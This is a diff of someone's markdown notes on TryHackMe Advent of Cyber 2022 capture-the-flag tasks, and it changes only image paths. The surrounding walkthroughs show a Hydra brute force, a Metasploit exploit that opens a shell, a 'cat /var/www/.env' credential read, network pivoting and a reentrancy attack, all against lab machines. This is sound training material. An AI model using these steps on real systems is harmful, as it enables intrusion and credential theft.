@@ -147,7 +147,7 @@ A: THM{IT'S A Y3T1 CHR1$TMA$}
 	-   Password changes
 	-   Application errors (used in debugging) 
 - Scenario:
-![Scenario](../../../Attachments/Pasted%20image%2020221207085808.png)
+![Scenario](../../../Pasted%20image%2020221207085808.png)
 
 - Log files come in all shapes and sizes. However, a useful log will contain at least some of the following attributes:
 
@@ -155,28 +155,28 @@ A: THM{IT'S A Y3T1 CHR1$TMA$}
 2.  The name of the service that is generating the logfile (I.e. SSH is a remote device management protocol that allows a user to login into a system remotely)
 3.  The actual event the service logs (i.e., in the event of a failed authentication, what credentials were tried, and by whom? (IP address)).
 
-![](../../../Attachments/Pasted%20image%2020221207092739.png)
+![](../../../Pasted%20image%2020221207092739.png)
 
 - On Windows:
-![](../../../Attachments/Pasted%20image%2020221207093133.png)
+![](../../../Pasted%20image%2020221207093133.png)
 
 - On this flavour of Linux, operating system log files (and often software-specific such as apache2) are located within the `/var/log` directory. We can use the `ls` in the `/var/log` directory to list all the log files located on the system:
 
-![](../../../Attachments/Pasted%20image%2020221207094016.png)
+![](../../../Pasted%20image%2020221207094016.png)
 
 - Important log files:
-![](../../../Attachments/Pasted%20image%2020221207094238.png)
+![](../../../Pasted%20image%2020221207094238.png)
 
 #grep 
 
 - Common options for `grep`:
-![](../../../Attachments/Pasted%20image%2020221207094541.png)
+![](../../../Pasted%20image%2020221207094541.png)
 
 ### Questions
 
   
 1. Use the `ls` command to list the files present in the current directory. How many log files are present?  
-![](../../../Attachments/Pasted%20image%2020221207095314.png)
+![](../../../Pasted%20image%2020221207095314.png)
 
  A: 2
 
@@ -200,7 +200,7 @@ A: Friday
 6. What is the name of the important list that the attacker stole from Santa?  
 
 - Did another grep but this time using pattern "santa":
-![](../../../Attachments/Pasted%20image%2020221207101004.png)
+![](../../../Pasted%20image%2020221207101004.png)
 
  A: santaslist.txt
 
@@ -208,7 +208,7 @@ A: Friday
 
 - First tried a grep on the /var/log files but that din not yield anything useful
 - THen tried it on the current directory and found a match
-![](../../../Attachments/Pasted%20image%2020221207101530.png)
+![](../../../Pasted%20image%2020221207101530.png)
 A: THM{STOLENSANTASLIST}
 ## [Day 3] `OSINT` Nothing escapes detective McRed
 
@@ -272,21 +272,21 @@ What is the name of the Registrar for the domain santagift.shop?
 
 - Searched on [WHOIS](https://who.is/whois/santagift.shop) the domain given and under the Registrar info the name can be found
 
-![](../../../Attachments/Pasted%20image%2020221208204158.png)
+![](../../../Pasted%20image%2020221208204158.png)
 
 A: NAMECHEAP INC
 
 Find the website's source code (repository) on [github.com](https://github.com/) and open the file containing sensitive credentials. Can you find the flag?  
 
 - Searched the domain on github and found this repo:
-![](../../../Attachments/Pasted%20image%2020221208204324.png)
+![](../../../Pasted%20image%2020221208204324.png)
 
 - The README file contains some useful info about credentials:
-![](../../../Attachments/Pasted%20image%2020221208204516.png)
+![](../../../Pasted%20image%2020221208204516.png)
 
 - Inded, the `config.php` contains the flag:
 
-![](../../../Attachments/Pasted%20image%2020221208204605.png)
+![](../../../Pasted%20image%2020221208204605.png)
 
 A: {THM_OSINT_WORKS}
 
@@ -298,7 +298,7 @@ What is the name of the QA server associated with the website?
 
 - A simple search for `qa` in the `config.php` file gets us the name of the domain in which the server is hosted:
 
-![](../../../Attachments/Pasted%20image%2020221208204735.png)
+![](../../../Pasted%20image%2020221208204735.png)
 
 A: qa.santagift.shop
 
@@ -306,7 +306,7 @@ What is the DB_PASSWORD that is being reused between the QA and PROD environment
 
 - The password can be found a bit lower:
 
-![](../../../Attachments/Pasted%20image%2020221208204837.png)
+![](../../../Pasted%20image%2020221208204837.png)
 
 A: S@nta2022
 ## [Day 4] `Scanning` Scanning through the snow
@@ -377,7 +377,7 @@ What is the name of the HTTP server running on the remote host?
 
 - Did an NMAP scan with the option `-sV` to get the services:
 
-![](../../../Attachments/Pasted%20image%2020221209210841.png)
+![](../../../Pasted%20image%2020221209210841.png)
 
 A: Apache
 
@@ -391,15 +391,15 @@ What flag can you find after successfully accessing the Samba service?
 
 - Typed in the address bar the location of the smb servers `smb://10.10.100.138/`
 
-![](../../../Attachments/Pasted%20image%2020221209211026.png)
+![](../../../Pasted%20image%2020221209211026.png)
 
 - Log in in the admins server using the credentials `ubuntu:S@nta2022`
 
-![](../../../Attachments/Pasted%20image%2020221209211138.png)
+![](../../../Pasted%20image%2020221209211138.png)
 
 - We get two files: `flag.txt` and `userlist.txt`:
 
-![](../../../Attachments/Pasted%20image%2020221209211222.png)
+![](../../../Pasted%20image%2020221209211222.png)
 
 - First one gets us the flag 
 
@@ -409,7 +409,7 @@ What is the password for the username santahr?
 
 - The second file found contains some users and their passwords:
 
-![](../../../Attachments/Pasted%20image%2020221209211330.png)
+![](../../../Pasted%20image%2020221209211330.png)
 
 A: santa25
 
@@ -504,7 +504,7 @@ Use Hydra to find the VNC password of the target with IP address `MACHINE_IP`. 
 
 - The VNC does not have a username so we don't specify that in our hydra attack:
 
-![](../../../Attachments/Pasted%20image%2020221210182114.png)
+![](../../../Pasted%20image%2020221210182114.png)
 
 A: 1q2w3e4r
 
@@ -512,7 +512,7 @@ Using a VNC client on the AttackBox, connect to the target of IP address `MACHI
 
 - Connecting via `Remmina` to the VNC server will enable us to get the flag, which is found on the desktop
 
-![](../../../Attachments/Pasted%20image%2020221210182352.png)
+![](../../../Pasted%20image%2020221210182352.png)
 
 A: THM{I_SEE_YOUR_SCREEN}
 ## [Day 6] `Email Analysis` It's beginning to look a lot like phishing
@@ -541,23 +541,23 @@ A: THM{I_SEE_YOUR_SCREEN}
 - Before learning how to conduct an email analysis, you need to know the structure of an email header. 
 - Email header structure:
 
-![](../../../Attachments/Pasted%20image%2020221210183110.png)
+![](../../../Pasted%20image%2020221210183110.png)
 
 - Analysing multiple header fields can be confusing at first glance, but starting from the key points will make the analysis process slightly easier. 
 - A simple process of email analysis is shown below:
 
-![](../../../Attachments/Pasted%20image%2020221210183411.png)
+![](../../../Pasted%20image%2020221210183411.png)
 
 #emlanalyzer
 
-![](../../../Attachments/Pasted%20image%2020221210183707.png)
+![](../../../Pasted%20image%2020221210183707.png)
 
 - Additionally, you can use some Open Source Intelligence (OSINT) tools to check email reputation and enrich the findings. 
 - Visit the given site below and do a reputation check on the sender address and the address found in the return path.
 
 -   **Tool:** `https://emailrep.io/`
 
-![](../../../Attachments/Pasted%20image%2020221210183850.png)
+![](../../../Pasted%20image%2020221210183850.png)
 
 
 ### Questions
@@ -567,7 +567,7 @@ What is the email address of the sender?
 - Used the `emlanalyzer` tool to get the info about the email and download the attachments:
 	- `emlAnalyzer -i Urgent\:.eml --header --html -u --text --extract-all`
 
-![](../../../Attachments/Pasted%20image%2020221210184411.png)
+![](../../../Pasted%20image%2020221210184411.png)
 
 
 A: chief.elf@santaclaus.thm
@@ -595,7 +595,7 @@ What is hidden in the value of the Message-ID field?
 Visit the email reputation check website provided in the task.  
 What is the reputation result of the sender's email address?  
 
-![](../../../Attachments/Pasted%20image%2020221210192717.png)
+![](../../../Pasted%20image%2020221210192717.png)
 
  A: RISKY
 
@@ -616,21 +616,21 @@ Visit the Virus Total website and use the hash value to search.
 Navigate to the behaviour section.  
 What is the second tactic marked in the Mitre ATT&CK section?  
 
-![](../../../Attachments/Pasted%20image%2020221210193148.png)
+![](../../../Pasted%20image%2020221210193148.png)
 
  A: Defense Evasion
 
 Visit the InQuest website and use the hash value to search.  
 What is the subcategory of the file?
 
-![](../../../Attachments/Pasted%20image%2020221210193313.png)
+![](../../../Pasted%20image%2020221210193313.png)
 
 A: macro_hunter
 ## [Day 7] `CyberChef` Maldocs roasting on an open fire
 
 #cyberchef 
 
-![](../../../Attachments/Pasted%20image%2020221213175253.png)
+![](../../../Pasted%20image%2020221213175253.png)
 
 1.  Add the text or file in panel 1.
 2.  Panel 2 contains various functions, also known as recipes that we use to encode, decode, parse, search or filter the data.
@@ -646,7 +646,7 @@ What is the version of CyberChef found in the attached VM?
 
 - Version can be seen on the top left corner of the offline CyberChef version in the deployed VM:
 
-![](../../../Attachments/Pasted%20image%2020221213175557.png)
+![](../../../Pasted%20image%2020221213175557.png)
 
  A: 9.49.0
 
@@ -660,7 +660,7 @@ We found a URL that was downloading a suspicious file; what is the name of that 
 
 - These are the final URLs:
 
-![](../../../Attachments/Pasted%20image%2020221213181142.png)
+![](../../../Pasted%20image%2020221213181142.png)
 
 - It is clear that the file we are talking about can be found in the first URL
 
@@ -672,7 +672,7 @@ What is the last defanged URL of the bandityeti domain found in the last step?
 
 - These are the defanged URLs:
 
-![](../../../Attachments/Pasted%20image%2020221213181338.png)
+![](../../../Pasted%20image%2020221213181338.png)
 
  A: hxxps[://]cdn[.]bandityeti[.]THM/files/index/
 
@@ -716,17 +716,17 @@ A: THM_MYSTERY_FLAG
 
 - Contract A authorizes the deposit after checking if any pre-determined conditions need to be met.
 - 
-![](../../../Attachments/Pasted%20image%2020221213182618.png)
+![](../../../Pasted%20image%2020221213182618.png)
 
 - Contract B calls the withdraw function of Contract A.
 
 - Contract A authorizes the deposit if the pre-determined conditions for withdrawal are met.
 
-![](../../../Attachments/Pasted%20image%2020221213182645.png)
+![](../../../Pasted%20image%2020221213182645.png)
 
 - Contract B can execute other functions after the Ether is sent from Contract A but before the function resolves.
 
-![](../../../Attachments/Pasted%20image%2020221213182708.png)
+![](../../../Pasted%20image%2020221213182708.png)
 
 ### How do Vulnerabilities in Smart Contracts Occur?
 
@@ -755,13 +755,13 @@ A: THM_MYSTERY_FLAG
 - Contract B will execute a function to deposit, then withdraw at least one Ether. 
 - This process is required to initiate the withdraw function's response.
 
-![](../../../Attachments/Pasted%20image%2020221213183035.png)
+![](../../../Pasted%20image%2020221213183035.png)
 
 - Note the difference between account balance and total balance in the above diagram. 
 - The storage contract separates balances per account and keeps each account's total balance combined. 
 - We are specifically targeting the total balance we do not own to exploit the contract.
 
-![](../../../Attachments/Pasted%20image%2020221213183129.png)
+![](../../../Pasted%20image%2020221213183129.png)
 
 - At this point, contract B can either drop the response from the withdraw function or invoke a fallback function. 
 - A fallback function is a reserved function in Solidity that can appear once in a single contract. 
@@ -769,7 +769,7 @@ A: THM_MYSTERY_FLAG
 - The fallback function calls the withdraw function again, while the original call to the function was never fully resolved. 
 - Remember, the balance is never set back to zero, and the contract thinks of Ether as its total balance when sending it, not divided into each account, so it will continue to send currency beyond the account's balance until the total balance is zero.
 
-![](../../../Attachments/Pasted%20image%2020221213183240.png)
+![](../../../Pasted%20image%2020221213183240.png)
 
 - Because the withdraw function sends Ether with no context or data, the fallback function will be called again, and thus an infinite loop can now occur.
 
@@ -781,7 +781,7 @@ What flag is found after attacking the provided EtherStore Contract?
 
 - Started with 10 ETH in the store and after executing the attack asking for just 1 ETH, the store is left with 0 ETH and the attacker gets 11 ETH in return
 
-![](../../../Attachments/Pasted%20image%2020221214081329.png)
+![](../../../Pasted%20image%2020221214081329.png)
 
 A: flag{411_ur_37h_15_m1n3}
 
@@ -852,13 +852,13 @@ ipconfig
 - For example - an initial foothold could be gained through a web application running in a docker container or through an exposed port on a Windows machine. 
 	- This system will become the attack launchpad for other systems in the network.
 
-![](../../../Attachments/Pasted%20image%2020221214092102.png)
+![](../../../Pasted%20image%2020221214092102.png)
 
 #pivoting
 - We can route network traffic through this compromised machine to run network scanning tools such as `nmap` or `[arp](arp.md)` to find additional machines and services which were previously inaccessible to the pentester. 
 	- This concept is called network **pivoting**.
 
-![](../../../Attachments/Pasted%20image%2020221214092207.png)
+![](../../../Pasted%20image%2020221214092207.png)
 
 #msfconsole
 - After msfconsole is opened, there are multiple commands available:
@@ -897,7 +897,7 @@ run
 
 - You can also directly set options from the `run` command:
 
-![](../../../Attachments/Pasted%20image%2020221214092944.png)
+![](../../../Pasted%20image%2020221214092944.png)
 
 ### Using Meterpreter to pivot
 
@@ -930,7 +930,7 @@ route print
 - You can run a socks proxy either locally on a pentester’s machine via Metasploit, or directly on the compromised server. 
 - In Metasploit, this can be achieved with the `auxiliary/server/socks_proxy` module:
 
-![](../../../Attachments/Pasted%20image%2020221214093408.png)
+![](../../../Pasted%20image%2020221214093408.png)
 
 - Tools such as `curl` support sending requests through a socks proxy server via the `--proxy` flag:
 ```shell
@@ -947,7 +947,7 @@ proxychains -q nmap -n -sT -Pn -p 22,80,443,5432 10.10.139.10
 
 - Ran nmap on the target:
 
-![](../../../Attachments/Pasted%20image%2020221214093711.png)
+![](../../../Pasted%20image%2020221214093711.png)
 
 Deploy the attached VM, and wait a few minutes. What ports are open?
 
@@ -957,7 +957,7 @@ What framework is the web application developed with?
 
 - Checking out the Network tab in the Developer tools on the website we found on port 80 will reveal a laravel cookie
 
-![](../../../Attachments/Pasted%20image%2020221214094138.png)
+![](../../../Pasted%20image%2020221214094138.png)
 
  A: laravel
 
@@ -971,7 +971,7 @@ What CVE is the application vulnerable to?
 
 - Checking if the target is vulnerable to this using `msfconsole`:
 
-![](../../../Attachments/Pasted%20image%2020221214094618.png)
+![](../../../Pasted%20image%2020221214094618.png)
 
 - Indeed.
 
@@ -985,13 +985,13 @@ What file indicates a session has been opened within a Docker container?
 
 - Used `run lhost=10.10.218.181 rhost=10.10.139.10 HttpClientTimeout=20` in `msfconsole` to attack the vulnerable machine, where `lhost` is the ip address of the machine running msfconsole.
 
-![](../../../Attachments/Pasted%20image%2020221214095127.png)
+![](../../../Pasted%20image%2020221214095127.png)
 
 - We got a shell
 - We want to upgrade to a `meterpreter` shell
 - So we run the following commands:
 
-![](../../../Attachments/Pasted%20image%2020221214095335.png)
+![](../../../Pasted%20image%2020221214095335.png)
 
 - `sessions -i -1` to get into the new meterpreter session
 - 
@@ -1000,7 +1000,7 @@ What file often contains useful credentials for web applications?
 
 - We do `cat /var/www/.env` in the meterpreter
 
-![](../../../Attachments/Pasted%20image%2020221214095522.png)
+![](../../../Pasted%20image%2020221214095522.png)
 
 - We get some database credentials
 
@@ -1009,7 +1009,7 @@ What file often contains useful credentials for web applications?
 - Get the ip adress of the service: `resolve webservice_database`
 - We hit `background` and add the IP to the routing terminal:
 
-![](../../../Attachments/Pasted%20image%2020221214095727.png)
+![](../../../Pasted%20image%2020221214095727.png)
 
 #important
 - We can also see, due to the presence of the `/.dockerenv` file, that we are in a docker container. 
@@ -1017,7 +1017,7 @@ What file often contains useful credentials for web applications?
 
 - Checking everything was added correctly:
 
-![](../../../Attachments/Pasted%20image%2020221214095858.png)
+![](../../../Pasted%20image%2020221214095858.png)
 
 - With the previously discovered database credentials and the routing table configured, we can start to run Metasploit modules that target Postgres. 
 - Starting with a schema dump, followed by running queries to select information out of the database:
@@ -1025,9 +1025,9 @@ What file often contains useful credentials for web applications?
 	- `run postgres://postgres:postgres@172.28.101.51/postgres`
 - We get a bunch of info:
 
-![](../../../Attachments/Pasted%20image%2020221214100127.png)
+![](../../../Pasted%20image%2020221214100127.png)
 
-![](../../../Attachments/Pasted%20image%2020221214100201.png)
+![](../../../Pasted%20image%2020221214100201.png)
 What database table contains useful credentials?  
 
  A: users
@@ -1040,7 +1040,7 @@ What is Santa's password?
 
 - We get santa's pw
 
-![](../../../Attachments/Pasted%20image%2020221214100350.png)
+![](../../../Pasted%20image%2020221214100350.png)
 
  A: `p4$$w0rd`
 
@@ -1052,7 +1052,7 @@ What ports are open on the host machine?
 
 - This will expose a port on the attacker machine that can be used to run other network tools through, such as `curl` or `proxychains`
 
-![](../../../Attachments/Pasted%20image%2020221214100828.png)
+![](../../../Pasted%20image%2020221214100828.png)
 
 - We see that SSHs 22 port is opened
 
@@ -1064,13 +1064,13 @@ What ports are open on the host machine?
 - In my case, this session had the id of 4
 	- So I did `sessions -i 4`
 
-![](../../../Attachments/Pasted%20image%2020221214101318.png)
+![](../../../Pasted%20image%2020221214101318.png)
 
  A: 22,80
 
 What is the root flag?
 
-![](../../../Attachments/Pasted%20image%2020221214101201.png)
+![](../../../Pasted%20image%2020221214101201.png)
 
 A: THM{47C61A0FA8738BA77308A8A600F88E4B}
  
@@ -1096,7 +1096,7 @@ A: THM{47C61A0FA8738BA77308A8A600F88E4B}
 - The main idea behind it is to provide you with the tools to easily find any piece of data stored in memory and modify it if needed. 
 - On top of that, it will let you modify a game's compiled code and alter its behaviours if you want, although we won't need to go that deep for this task.
 
-![](../../../Attachments/Pasted%20image%2020221216165336.png)
+![](../../../Pasted%20image%2020221216165336.png)
 
 - If you walk around the game, you will find that the guard won't let you leave unless you guess a randomly generated number. 
 - At some point, the game must store this number in memory. 
@@ -1105,13 +1105,13 @@ A: THM{47C61A0FA8738BA77308A8A600F88E4B}
 - As a first step, talk to the guard and try to guess the number randomly. 
 	- You probably won't guess it first try, but take note of the guard's number.
 
-![](../../../Attachments/Pasted%20image%2020221216165628.png)
+![](../../../Pasted%20image%2020221216165628.png)
 
-![](../../../Attachments/Pasted%20image%2020221216165742.png)
+![](../../../Pasted%20image%2020221216165742.png)
 
 - With Cetus on the bookmarks tab, talk to the guard again and notice how the random number changes immediately
 
-![](../../../Attachments/Pasted%20image%2020221216170010.png)
+![](../../../Pasted%20image%2020221216170010.png)
 
 - While you are wondering what other data in memory could be changed to survive the bridge, Elf Recon McRed tells you that he read about **differential search**. 
 - Differential Search, he said, allows you to run successive searches in tandem, where each search will be scoped over the results of the last search only instead of the whole memory space. 
@@ -1126,7 +1126,7 @@ What is the Guard's flag?
 
 - Pressing space next to the guard after he unlocks the door will get you the flag:
 
-![](../../../Attachments/Pasted%20image%2020221216170117.png)
+![](../../../Pasted%20image%2020221216170117.png)
 
 A: THM{5_star_Fl4gzzz}
 
@@ -1134,24 +1134,24 @@ What is the Yeti's flag?
 
 - First I searched for all of the memory values with no value entered:
 
-![](../../../Attachments/Pasted%20image%2020221216171205.png)
+![](../../../Pasted%20image%2020221216171205.png)
 
 - Then I do another search but only after I take some hits from the snowballs:
 
-![](../../../Attachments/Pasted%20image%2020221216171249.png)
+![](../../../Pasted%20image%2020221216171249.png)
 
 - Then I do this again and I observe that there is one memory address that keeps decreasing and also it is kind of telling me the HP that i have left
 
 
-![](../../../Attachments/Pasted%20image%2020221216171143.png)
+![](../../../Pasted%20image%2020221216171143.png)
 
 - I immediately change this to a very high value and I am through:
 
-![](../../../Attachments/Pasted%20image%2020221216171403.png)
+![](../../../Pasted%20image%2020221216171403.png)
 
 - After some discussions, I get the flag:
 
-![](../../../Attachments/Pasted%20image%2020221216171451.png)
+![](../../../Pasted%20image%2020221216171451.png)
 A: 
 
 ## [Day 11] `Memory Forensics` Not all gifts are nice
@@ -1193,7 +1193,7 @@ A:
 
 - On a computer, processes are usually categorised into two groups:
 
-![](../../../Attachments/Pasted%20image%2020221216172251.png)
+![](../../../Pasted%20image%2020221216172251.png)
 
 ### Introducing Volatility  
 
@@ -1214,7 +1214,7 @@ A:
 	-   Any options such as the name and location of the memory dump
 	-   The action you want to perform (I.e. what plugins you want to use)
 
-![](../../../Attachments/Pasted%20image%2020221216172541.png)
+![](../../../Pasted%20image%2020221216172541.png)
 
 - Volatility uses plugins to perform analysis, such as:
 	-   Listing processes
@@ -1235,7 +1235,7 @@ _Note: This can sometimes take a couple of minutes, depending on the size of the
 - We can see that Volatility has confirmed that the Operating System is Windows. With this information, we now know we need to use the Windows sub-set of plugins with Volatility.
 - Thus, we can use the following plugins:
 
-![](../../../Attachments/Pasted%20image%2020221216173510.png)
+![](../../../Pasted%20image%2020221216173510.png)
 
 - _Please note that this is not all of the possible plugins. An extensive list of the Windows sub-set of plugins can be found [here](https://volatility3.readthedocs.io/en/stable/volatility3.plugins.windows.html)._
 
@@ -1269,7 +1269,7 @@ Dump the contents of this binary. How many files are dumped?
 
 - Used the command: `python3 vol.py -f workstation.vmem windows.dumpfiles --pid 2040`.
 
-![](../../../Attachments/Pasted%20image%2020221216174140.png)
+![](../../../Pasted%20image%2020221216174140.png)
 
 A: 16
 ## [Day 12] `Malware Analysis` Forensic McBlue to the REVscue!
@@ -1328,7 +1328,7 @@ A: 16
 	-   Note: Strings are pieces of text inside a binary, often containing information such as IP addresses, URLs, or file names used by the malicious program.
 	-   Run **CAPA,** which shows that the binary mostly hides its logic and analysis is affected due to a packer.
 
-![](../../../Attachments/Pasted%20image%2020221216204526.png)
+![](../../../Pasted%20image%2020221216204526.png)
 
 ### **CAPA**
 #capa
@@ -1339,13 +1339,13 @@ A: 16
 
 - So now, let's unpack the binary using UPX and re-analyse the binaries using CAPA.
 
-![](../../../Attachments/Pasted%20image%2020221216205126.png)
+![](../../../Pasted%20image%2020221216205126.png)
 
 - You may observe that CAPA now has provided important information about the malware sample.
 
 - Note: We have executed `del mysterygift.viv` to delete the cached results of the first CAPA execution. By deleting the viv file, CAPA re-analyses the binary with accurate results.
 
-![](../../../Attachments/Pasted%20image%2020221216205340.png)
+![](../../../Pasted%20image%2020221216205340.png)
 
 
 ### Deep-dive into Dynamic Malware Analysis
@@ -1359,7 +1359,7 @@ A: 16
 - In this case, we want to only focus on events generated by `mysterygift.exe` process. 
 - Let's set the condition `Process Name - is - mysterygift.exe` ; add the filter and choose **OK** to close the prompt.
 
-![](../../../Attachments/Pasted%20image%2020221216205840.png)
+![](../../../Pasted%20image%2020221216205840.png)
 
 - ProcMon has a panel that can filter the following, as highlighted in the image below (in sequence):
 
@@ -1368,7 +1368,7 @@ A: 16
 	-   Show Network Activity
 	-   Show Process and Thread Activity
 	-   Show Profiling Events
-![](../../../Attachments/Pasted%20image%2020221216210433.png)
+![](../../../Pasted%20image%2020221216210433.png)
 
 #### **Registry Modification**
 
@@ -1381,7 +1381,7 @@ A: 16
 -   RegQueryKey
 -   RegCloseKey
 
-![](../../../Attachments/Pasted%20image%2020221216210703.png)
+![](../../../Pasted%20image%2020221216210703.png)
 
 - You may observe that only one Registry Key has both **RegCreateKey** and **RegSetValue**. 
 - This key is related to a persistence technique called **Registry Run Key Modification** and is commonly used by malware developers to install a backdoor.
@@ -1404,7 +1404,7 @@ A: 16
 
 The view from ProcMon should yield fewer results, similar to the image below.
 
-![](../../../Attachments/Pasted%20image%2020221216211401.png)
+![](../../../Pasted%20image%2020221216211401.png)
 
 - you may observe that two files are written under the `**C:\Users\Administrator**` directory.
 - The first file is located in the user's **TEMP** directory, which is commonly used by malware to drop another file for its disposal. 
@@ -1418,7 +1418,7 @@ The view from ProcMon should yield fewer results, similar to the image below.
 - Unclick all filters and choose the third filter - Show Network Activity. 
 	- Unlike the previous filters, the results are few and can be easily interpreted.
 
-![](../../../Attachments/Pasted%20image%2020221216211743.png)
+![](../../../Pasted%20image%2020221216211743.png)
 
 
 ### Conclusion  
@@ -1438,7 +1438,7 @@ What is the architecture of the malware sample? (32-bit/64-bit)
 
 - Opened the sample with DIE:
 
-![](../../../Attachments/Pasted%20image%2020221216204320.png)
+![](../../../Pasted%20image%2020221216204320.png)
 
  A: 64-bit
 
@@ -1450,7 +1450,7 @@ What is the compiler used to build the malware sample? (format: lowercase)
 
 - Ran CAPA with the options `-vv`
 
-![](../../../Attachments/Pasted%20image%2020221216204937.png)
+![](../../../Pasted%20image%2020221216204937.png)
 
  A: Nim
 
@@ -1460,7 +1460,7 @@ How many MITRE ATT&CK techniques have been discovered attributed to the DISCOV
 - Running CAPA again after we unpack the malware gives better results:
 
 
-![](../../../Attachments/Pasted%20image%2020221216205340.png)
+![](../../../Pasted%20image%2020221216205340.png)
 
 
  A: 2
@@ -1495,7 +1495,7 @@ Going back to strings inside the malware sample, what is the complete URL used t
 - Went back to DIE and look through `Strings`
 - Filter it using `thm`
 
-![](../../../Attachments/Pasted%20image%2020221216212226.png)
+![](../../../Pasted%20image%2020221216212226.png)
 
 
 
@@ -1528,13 +1528,13 @@ A: `http://bestfestivalcompany.thm/favicon.ico`
 - There are various points to consider before conducting packet analysis. 
 - The essential points are listed below.
 
-![](../../../Attachments/Pasted%20image%2020221216221839.png)
+![](../../../Pasted%20image%2020221216221839.png)
 
 - When the time comes to do "packet level analysis", it might sound hard to implement the theory in practice. 
 - But creating "checklists" and "mini playbooks" will make the analysis process considerably easier. 
 - A simple process checklist for practical packet analysis is shown below.
 
-![](../../../Attachments/Pasted%20image%2020221216222012.png)
+![](../../../Pasted%20image%2020221216222012.png)
 
 ### What is Wireshark and How to Use It?
 #wireshark 
@@ -1543,12 +1543,12 @@ A: `http://bestfestivalcompany.thm/favicon.ico`
 - You can view, save and break down the network traffic with it. 
 - You can learn more about Wireshark by completing the [**Wireshark module**](https://tryhackme.com/module/wireshark).
 
-![](../../../Attachments/Pasted%20image%2020221216222433.png)
+![](../../../Pasted%20image%2020221216222433.png)
 
 - You can also view the connections by IP and TCP/UDP protocols to view the overall usage of the ports and services (including the total packet numbers transferred over a particular port and between two hosts). 
 - The next step is viewing the IP conversations to spot if there is a weird/suspicious/not usual IP address in use.
 
-![](../../../Attachments/Pasted%20image%2020221216222716.png)
+![](../../../Pasted%20image%2020221216222716.png)
 
 - Now we have a detailed list of the IP addresses, port numbers, and the number of packets transferred from one endpoint to another. 
 	- This information will help us identify suspicious IP addresses, connections and ports.
@@ -1588,7 +1588,7 @@ A: `http://bestfestivalcompany.thm/favicon.ico`
 - You will find the interacted domain under the `queries` section. 
 - See the below example and continue the analysis by analysing all available DNS packets.
 
-![](../../../Attachments/Pasted%20image%2020221216223941.png)
+![](../../../Pasted%20image%2020221216223941.png)
 
 Before continuing on HTTP analysis, ensure you have completed the following checks and answered the analysis questions.  
 
@@ -1616,7 +1616,7 @@ Before continuing on HTTP analysis, ensure you have completed the following c
 - You will find the requested resource paths under the `Full Request URI` section. 
 - Also, you can evaluate the `user-agent` section to check if there is anomalous or non-standard user-agent info. 
 
-![](../../../Attachments/Pasted%20image%2020221216224355.png)
+![](../../../Pasted%20image%2020221216224355.png)
 
 - Two files are requested: `favicon.ico` and `mysterygift.exe`
 
@@ -1644,7 +1644,7 @@ Before continuing on HTTP analysis, ensure you have completed the following c
 - Now close/minimise the Wireshark GUI and open a terminal window on the desktop. 
 - Use the `sha256sum` and `VirusTotal` tools shown on Day 6 to calculate the file hash value and to conduct hash-based file reputation analysis.
 
-![](../../../Attachments/Pasted%20image%2020221216225455.png)
+![](../../../Pasted%20image%2020221216225455.png)
 
 - Before concluding the analysis, ensure you have completed the following checks and answered the analysis questions.  
 
@@ -1697,7 +1697,7 @@ Which port number has received more than 1000 packets?
 
 What is the service name of the used protocol that received more than 1000 packets?  
 
-![](../../../Attachments/Pasted%20image%2020221216222841.png)
+![](../../../Pasted%20image%2020221216222841.png)
 
 - Port 3389 is used for RDP
 
@@ -1710,7 +1710,7 @@ Enter the domains in alphabetical order and defanged format. (format: domai
 
 - FIlter the dns packets:
 
-![](../../../Attachments/Pasted%20image%2020221216223818.png)
+![](../../../Pasted%20image%2020221216223818.png)
 
 - We see that we have two queries and two responses, hence we have two domains
 - We defang them using CyberChef
@@ -1742,7 +1742,7 @@ Enter your answer in defanged format.
 - We click on the http packet and expand the Hypertext Transfer Protocol tab
 
 
-![](../../../Attachments/Pasted%20image%2020221216224833.png)
+![](../../../Pasted%20image%2020221216224833.png)
 
  A:`cdn[.]bandityeti[.]thm
 
@@ -1750,7 +1750,7 @@ What is the "user-agent" value used to download the non-executable file?
 
 - We expand the same tab but of the other http packet
 
-![](../../../Attachments/Pasted%20image%2020221216225047.png)
+![](../../../Pasted%20image%2020221216225047.png)
 
  A: Nim httpclient/1.6.8
 
@@ -1775,7 +1775,7 @@ Please note that the VT entry changed since the official walkthrough video was r
 - The hash of `mysterygift.exe` is `0ce160a54d10f8e81448d0360af5c2948ff6a4dbb493fe4be756fc3e2c3f900f`
 - Searched it on VirusTotal:
 
-![](../../../Attachments/Pasted%20image%2020221216230040.png)
+![](../../../Pasted%20image%2020221216230040.png)
 
 - Ignored the first and the last and also the DNS server
 
@@ -1857,34 +1857,34 @@ A: `20[.]99[.]133[.]109, 20[.]99[.]184[.]37, 23[.]216[.]147[.]64, 23[.]216[.]147
 - Although the system should deny them access to the new URL due to lack of authorization, an IDOR vulnerability will let the user display such unauthorized pages. 
 - In the figure below, the user managed to access the user’s account page with ID `101`.
 
-![](../../../Attachments/Pasted%20image%2020221216231338.png)
+![](../../../Pasted%20image%2020221216231338.png)
 - Consider the example where requesting an invoice generates a link similar to this: `http://santagift.shop/invoices?download=115`. 
 - To test for vulnerabilities, one would replace `115` with another number, as shown in the image below. 
 	- The system is vulnerable if it lets them access other users’ invoices.
 
-![](../../../Attachments/Pasted%20image%2020221216231431.png)
+![](../../../Pasted%20image%2020221216231431.png)
 
 - The impact of an IDOR vulnerability might let you reset the password of another user. 
 - For instance, after logging in, a malicious user might start with the URL to change their password and replace their username with that of another user. 
 	- For example, the attacker would replace their username `yeti` in the URL `http://santagift.shop/account/changepassword=yeti` with another valid username and attempt to change their password, as shown in the figure below. 
 
-![](../../../Attachments/Pasted%20image%2020221216231602.png)
+![](../../../Pasted%20image%2020221216231602.png)
 
 ### Questions
 
 - Logged in with the given credentials:
 
-![](../../../Attachments/Pasted%20image%2020221216231953.png)
+![](../../../Pasted%20image%2020221216231953.png)
   
 What is the office number of Elf Pivot McRed?
 
 - Changing the 101 in the URL to a 102 gives me McBlue:
 
-![](../../../Attachments/Pasted%20image%2020221216232123.png)
+![](../../../Pasted%20image%2020221216232123.png)
 
 - 105 gives me McRed:
 
-![](../../../Attachments/Pasted%20image%2020221216232219.png)
+![](../../../Pasted%20image%2020221216232219.png)
 
 A: 134
 
@@ -1892,14 +1892,14 @@ Not only profile pages but also stored images are vulnerable. Start with a URL o
 
 - Right click on an image and click `Copy Image Location` to copy the link of that image:
 
-![](../../../Attachments/Pasted%20image%2020221216232440.png)
+![](../../../Pasted%20image%2020221216232440.png)
 
-![](../../../Attachments/Pasted%20image%2020221216232510.png)
+![](../../../Pasted%20image%2020221216232510.png)
 
 - We see that the URL is still vulnerable to IDOR
